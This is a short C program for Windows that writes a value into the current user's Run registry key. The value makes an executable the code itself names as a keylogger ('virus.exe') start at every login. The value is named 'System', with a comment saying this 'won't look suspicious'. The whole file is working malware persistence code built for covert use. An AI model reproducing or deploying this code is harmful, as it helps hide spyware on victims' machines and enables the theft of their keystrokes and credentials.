#include <Windows.h>
#include <stdio.h>
#include <string.h>

#define PATH_TO_KEY_LOGGER "C:\\Users\\User\\source\\repos\\virus\\Debug\\virus.exe"
#define VALUE_NAME "System" // won't look suspicious

#define ERROR -1
#define SUCCESS 0

int main()
{
	HKEY key;
	LSTATUS result = 0;
	result = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
	if (result != ERROR_SUCCESS)
	{
		perror("Error opening registry key");
		return ERROR;
	}
	else
	{
		result = RegSetValueExA(key, VALUE_NAME, 0, REG_SZ, PATH_TO_KEY_LOGGER, strlen(PATH_TO_KEY_LOGGER) + 1);
		if (result != ERROR_SUCCESS)
		{
			perror("Error change registry value");
			return ERROR;
		}
		printf("Added value to registry key successfully\n");
		RegCloseKey(key);
	}
	return SUCCESS;
}